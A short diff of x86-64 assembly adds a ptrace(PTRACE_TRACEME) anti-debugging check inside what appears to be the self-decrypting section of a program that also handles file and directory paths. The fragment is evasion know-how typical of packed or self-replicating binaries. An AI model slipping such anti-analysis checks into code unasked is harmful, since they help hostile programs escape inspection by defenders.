@@ -42,7 +42,14 @@ decrypte:
     mov bl, byte [rsi]
 	sub [rdi], bl
 encrypted_start:
-
+    xor rdi, rdi ;  PTRACE_TRACEME
+    xor rsi, rsi
+    mov rdx, 1
+    xor r10, r10
+    mov rax, SYS_PTRACE
+    syscall             ; ptrace(PTRACE_TRACEME, 0, 1, 0);
+    cmp rax, 0
+    jl exit
     lea rdi, [rsp + fileName]
     lea rsi, [rel firstDir]
     call ft_strcpy
